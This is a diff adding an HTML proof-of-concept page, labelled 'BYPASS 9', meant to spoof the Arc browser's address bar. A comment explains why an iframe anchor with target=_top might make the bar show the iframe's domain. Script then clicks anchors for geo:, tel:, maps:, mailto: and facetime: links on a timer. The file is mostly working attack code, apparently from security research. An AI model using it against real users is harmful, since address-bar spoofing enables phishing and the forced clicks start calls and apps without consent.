@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 9: Anchor with target=_top
+
+  When an anchor is clicked, WKNavigationDelegate receives a navigationAction with:
+  - navigationType = .linkActivated
+  - sourceFrame = this iframe
+  - targetFrame = top frame (because target="_top")
+
+  The fix checks targetFrame.isMainFrame (which is true for _top).
+  But the sourceFrame is the iframe. If Arc reads sourceFrame.securityOrigin
+  to update the bar, it picks up the iframe's domain.
+
+  Also: the system prompt for geo: might show a confirmation dialog.
+  During that dialog, the address bar state might already be updated.
+-->
+
+<!-- Multiple anchors with different schemes and targets -->
+<a id="a1" href="geo:0,0" target="_top">.</a>
+<a id="a2" href="tel:+1234567890" target="_top">.</a>
+<a id="a3" href="maps:?q=test" target="_top">.</a>
+<a id="a4" href="mailto:x@x.com" target="_top">.</a>
+<a id="a5" href="facetime:x@x.com" target="_top">.</a>
+
+<!-- Also try _parent -->
+<a id="a6" href="geo:0,0" target="_parent">.</a>
+<a id="a7" href="geo:0,0" target="_blank">.</a>
+
+<script>
+  // Programmatic clicks fire the navigation
+  setTimeout(function() { document.getElementById('a1').click(); }, 200);
+  setTimeout(function() { document.getElementById('a2').click(); }, 600);
+  setTimeout(function() { document.getElementById('a3').click(); }, 1000);
+  setTimeout(function() { document.getElementById('a4').click(); }, 1400);
+  setTimeout(function() { document.getElementById('a5').click(); }, 1800);
+  setTimeout(function() { document.getElementById('a6').click(); }, 2200);
+  setTimeout(function() { document.getElementById('a7').click(); }, 2600);
+</script>
+</body>
+</html>
